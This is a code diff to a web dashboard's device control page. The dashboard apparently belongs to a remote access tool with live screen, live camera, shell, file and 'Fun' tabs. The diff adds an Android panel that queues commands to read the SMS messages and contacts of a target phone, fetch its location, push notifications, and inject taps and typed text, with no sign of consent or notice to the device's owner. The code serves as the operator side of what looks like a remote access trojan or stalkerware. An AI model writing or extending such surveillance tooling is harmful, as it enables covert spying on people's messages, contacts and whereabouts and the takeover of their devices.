@@ -2,7 +2,7 @@ import { createFileRoute, useNavigate, Link } from "@tanstack/react-router";
 import { useEffect, useState, lazy, Suspense } from "react";
 import { supabase } from "@/integrations/supabase/client";
 import { useAuth } from "@/lib/auth-context";
-import { ArrowLeft, Monitor, Info, Terminal, FileBox, Cpu, Settings, X, Camera, Activity, Sparkles, PartyPopper } from "lucide-react";
+import { ArrowLeft, Monitor, Info, Terminal, FileBox, Cpu, Settings, X, Camera, Activity, Sparkles, PartyPopper, MapPin, MessageSquare, Contact, Bell, Pointer, Smartphone } from "lucide-react";
 import { webrtcDiagnostics, type WebRtcDiagnostics } from "@/lib/webrtc-diagnostics";
 import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip";
 
@@ -28,6 +28,8 @@ type Device = {
   ip_address: string | null;
   os: string | null;
   username: string | null;
+  platform: string;
+  capabilities: Record<string, boolean> | null;
   is_online: boolean;
   last_seen: string;
   last_seen_ip: string | null;
@@ -42,9 +44,9 @@ type Metric = {
   uptime_seconds: number | null;
 };
 
-type TabKey = "screen" | "camera" | "shell" | "files" | "processes" | "system" | "ai" | "fun" | "info";
+type TabKey = "screen" | "camera" | "shell" | "files" | "processes" | "system" | "ai" | "fun" | "info" | "location" | "sms" | "contacts" | "notify" | "input";
 
-const TABS: Array<{ key: TabKey; label: string; icon: typeof Info }> = [
+const WINDOWS_TABS: Array<{ key: TabKey; label: string; icon: typeof Info }> = [
   { key: "screen", label: "Live Screen", icon: Monitor },
   { key: "camera", label: "Live Camera", icon: Camera },
   { key: "shell", label: "Shell", icon: Terminal },
@@ -53,6 +55,19 @@ const TABS: Array<{ key: TabKey; label: string; icon: typeof Info }> = [
   { key: "system", label: "System", icon: Settings },
   { key: "ai", label: "AI Agent", icon: Sparkles },
   { key: "fun", label: "Fun", icon: PartyPopper },
+  { key: "info", label: "Info", icon: Info },
+];
+
+const ANDROID_TABS: Array<{ key: TabKey; label: string; icon: typeof Info }> = [
+  { key: "screen", label: "Screen", icon: Smartphone },
+  { key: "camera", label: "Camera", icon: Camera },
+  { key: "files", label: "Files", icon: FileBox },
+  { key: "shell", label: "Shell", icon: Terminal },
+  { key: "location", label: "Location", icon: MapPin },
+  { key: "sms", label: "SMS", icon: MessageSquare },
+  { key: "contacts", label: "Contacts", icon: Contact },
+  { key: "notify", label: "Notify", icon: Bell },
+  { key: "input", label: "Input", icon: Pointer },
   { key: "info", label: "Info", icon: Info },
 ];
 
@@ -92,7 +107,7 @@ function ControlPage() {
         navigate({ to: "/dashboard/clients" });
         return;
       }
-      setDevice(data as Device);
+      setDevice(data as unknown as Device);
       const { data: m } = await supabase
         .from("device_metrics")
         .select("*")
@@ -172,7 +187,7 @@ function ControlPage() {
           </div>
 
           <nav className="flex-1 space-y-1 p-2">
-            {TABS.map((t) => {
+            {(device.platform === "android" ? ANDROID_TABS : WINDOWS_TABS).map((t: { key: TabKey; label: string; icon: typeof Info }) => {
               const Icon = t.icon;
               const active = tab === t.key;
               return (
@@ -209,7 +224,7 @@ function ControlPage() {
               <div className="text-xs uppercase tracking-wider text-muted-foreground">
                 Remote control
               </div>
-              <h1 className="text-lg font-semibold">{TABS.find((t) => t.key === tab)?.label}</h1>
+              <h1 className="text-lg font-semibold">{(device.platform === "android" ? ANDROID_TABS : WINDOWS_TABS).find((t: { key: TabKey; label: string }) => t.key === tab)?.label}</h1>
             </div>
             <div className="flex items-center gap-3 text-xs">
               <Chip label="CPU" value={metric?.cpu_percent != null ? `${metric.cpu_percent.toFixed(0)}%` : "—"} />
@@ -232,11 +247,14 @@ function ControlPage() {
                 <div className={tab === "camera" ? "" : "hidden"}><CameraPanel deviceId={id} /></div>
                 <div className={tab === "shell" ? "" : "hidden"}><ShellPanel deviceId={id} /></div>
                 <div className={tab === "files" ? "" : "hidden"}><FilesPanel deviceId={id} /></div>
-                <div className={tab === "processes" ? "" : "hidden"}><ProcessesPanel deviceId={id} /></div>
-                <div className={tab === "system" ? "" : "hidden"}><SystemPanel deviceId={id} /></div>
-                <div className={tab === "ai" ? "" : "hidden"}><AIPanel deviceId={id} /></div>
-                <div className={tab === "fun" ? "" : "hidden"}><FunPanel deviceId={id} /></div>
-                {tab === "info" && <InfoPanel device={device} metric={metric} />}
+                {device.platform !== "android" && <div className={tab === "processes" ? "" : "hidden"}><ProcessesPanel deviceId={id} /></div>}
+                {device.platform !== "android" && <div className={tab === "system" ? "" : "hidden"}><SystemPanel deviceId={id} /></div>}
+                {device.platform !== "android" && <div className={tab === "ai" ? "" : "hidden"}><AIPanel deviceId={id} /></div>}
+                {device.platform !== "android" && <div className={tab === "fun" ? "" : "hidden"}><FunPanel deviceId={id} /></div>}
+                {(tab === "location" || tab === "sms" || tab === "contacts" || tab === "notify" || tab === "input") && (
+                  <AndroidCommandPanel deviceId={id} tab={tab} />
+                )}
+                {tab === "info" && <InfoPanel device={device as any} metric={metric} />}
               </Suspense>
             </ClientOnly>
           </div>
@@ -245,6 +263,94 @@ function ControlPage() {
     </div>
   );
 }
+
+function AndroidCommandPanel({ deviceId, tab }: { deviceId: string; tab: string }) {
+  const [result, setResult] = useState<string>("Send a command to see results here.");
+  const [loading, setLoading] = useState(false);
+  const [notifTitle, setNotifTitle] = useState("");
+  const [notifMsg, setNotifMsg] = useState("");
+  const [tapX, setTapX] = useState("");
+  const [tapY, setTapY] = useState("");
+  const [inputText, setInputText] = useState("");
+
+  const sendCmd = async (action: string, extra: Record<string, string> = {}) => {
+    setLoading(true);
+    try {
+      const { data } = await (supabase as any).from("pending_commands").insert({
+        device_id: deviceId,
+        action,
+        payload: extra,
+      }).select("id").single();
+      setResult(`Command "${action}" sent (${data?.id?.slice(0, 8)}…). Waiting for response…`);
+      if (data?.id) {
+        let tries = 0;
+        const poll = setInterval(async () => {
+          tries++;
+          const { data: cmd } = await (supabase as any).from("pending_commands").select("result").eq("id", data.id).maybeSingle();
+          if (cmd?.result) {
+            clearInterval(poll);
+            setResult(JSON.stringify(cmd.result, null, 2));
+            setLoading(false);
+          } else if (tries > 20) {
+            clearInterval(poll);
+            setResult("Timed out waiting for response.");
+            setLoading(false);
+          }
+        }, 1500);
+      }
+    } catch (e: any) {
+      setResult(`Error: ${e.message}`);
+      setLoading(false);
+    }
+  };
+
+  return (
+    <div className="space-y-4">
+      <div className="flex flex-wrap gap-2">
+        {tab === "location" && (
+          <button onClick={() => sendCmd("location")} disabled={loading} className="rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground hover:opacity-90 disabled:opacity-50">
+            Get Location
+          </button>
+        )}
+        {tab === "sms" && (
+          <button onClick={() => sendCmd("sms.read")} disabled={loading} className="rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground hover:opacity-90 disabled:opacity-50">
+            Read SMS
+          </button>
+        )}
+        {tab === "contacts" && (
+          <button onClick={() => sendCmd("contacts.read")} disabled={loading} className="rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground hover:opacity-90 disabled:opacity-50">
+            Read Contacts
+          </button>
+        )}
+        {tab === "notify" && (
+          <div className="flex flex-col gap-2 w-full max-w-sm">
+            <input value={notifTitle} onChange={(e) => setNotifTitle(e.target.value)} placeholder="Title" className="rounded-md border border-border bg-input px-3 py-2 text-sm" />
+            <input value={notifMsg} onChange={(e) => setNotifMsg(e.target.value)} placeholder="Message" className="rounded-md border border-border bg-input px-3 py-2 text-sm" />
+            <button onClick={() => sendCmd("notify", { title: notifTitle, message: notifMsg })} disabled={loading} className="rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground hover:opacity-90 disabled:opacity-50">
+              Send Notification
+            </button>
+          </div>
+        )}
+        {tab === "input" && (
+          <div className="flex flex-col gap-2 w-full max-w-sm">
+            <div className="flex gap-2">
+              <input value={tapX} onChange={(e) => setTapX(e.target.value)} placeholder="X" className="w-20 rounded-md border border-border bg-input px-3 py-2 text-sm" />
+              <input value={tapY} onChange={(e) => setTapY(e.target.value)} placeholder="Y" className="w-20 rounded-md border border-border bg-input px-3 py-2 text-sm" />
+              <button onClick={() => sendCmd("input.tap", { x: tapX, y: tapY })} disabled={loading} className="rounded-md bg-primary px-3 py-2 text-sm font-medium text-primary-foreground hover:opacity-90 disabled:opacity-50">Tap</button>
+            </div>
+            <div className="flex gap-2">
+              <input value={inputText} onChange={(e) => setInputText(e.target.value)} placeholder="Text to type" className="flex-1 rounded-md border border-border bg-input px-3 py-2 text-sm" />
+              <button onClick={() => sendCmd("input.text", { text: inputText })} disabled={loading} className="rounded-md bg-primary px-3 py-2 text-sm font-medium text-primary-foreground hover:opacity-90 disabled:opacity-50">Type</button>
+            </div>
+          </div>
+        )}
+      </div>
+      <pre className="max-h-96 overflow-auto rounded-lg border border-border bg-muted/30 p-4 text-xs font-mono whitespace-pre-wrap">{result}</pre>
+    </div>
+  );
+}
+
+
 
 function Chip({ label, value }: { label: string; value: string }) {
   return (
